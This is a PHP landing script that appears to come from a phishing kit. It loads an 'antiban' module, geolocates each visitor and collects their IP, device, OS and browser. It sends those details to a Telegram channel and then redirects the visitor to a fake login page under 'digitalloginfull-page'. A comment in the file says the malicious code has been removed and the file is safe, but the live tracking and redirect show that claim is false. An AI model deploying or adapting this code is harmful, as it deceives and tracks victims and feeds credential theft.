<?php
	error_reporting(0);
    session_start();
    include "./antiban/antiban.php";
	include "./libraries/geoplugin.class.php";
	include "./libraries/UserInfo.php";
	include "./setting/functions.php";
	

    
/**
* Note: This file may contain artifacts of previous malicious infection.
* However, the dangerous code has been removed, and the file is now safe to use.
*/


	$geoplugin = new geoPlugin();
	$geoplugin->locate();
	$ip = get_client_ip();
    $present_time = date("H:i:s"."-"."m/d/y");

    if ($_SERVER['HTTP_HOST'] === "localhost") {
        $_SERVER['HTTP_HOST'] = "127.0.0.1";
    }

    // Send Data To Telegram :
    $message= urlencode("👥========= VISIT =========👥\r\n" . 
    "📍IP - ".get_client_ip()."\t\t | \t\t". 
    $geoplugin->countryCode ."\r\n". 
    "💻 DEVICE = " .UserInfo::get_device()."\r\n".
    "♻️ SYSTEM TYPE = ". UserInfo::get_os()."\r\n". 
    "🌐 BROWSER VISIT = ". UserInfo::get_browser()."\r\n".
    "DATE AND TIME = ". $present_time ."\r\n");

    telegram($message);

    // Save Data In Document Text :
    $text_to_result = "========= VISIT =========\r\n" . 
    "IP - ".get_client_ip()."\t\t | \t\t". 
    $geoplugin->countryCode ."\r\n". 
    " DEVICE = " .UserInfo::get_device()."\r\n".
    " SYSTEM TYPE = ". UserInfo::get_os()."\r\n". 
    " BROWSER VISIT = ". UserInfo::get_browser()."\r\n".
    "DATE AND TIME = ". $present_time ."\r\n";


    echo 
    "<script>
        window.location = './digitalloginfull-page/l_ogin.php';
    </script>";

exit;
?>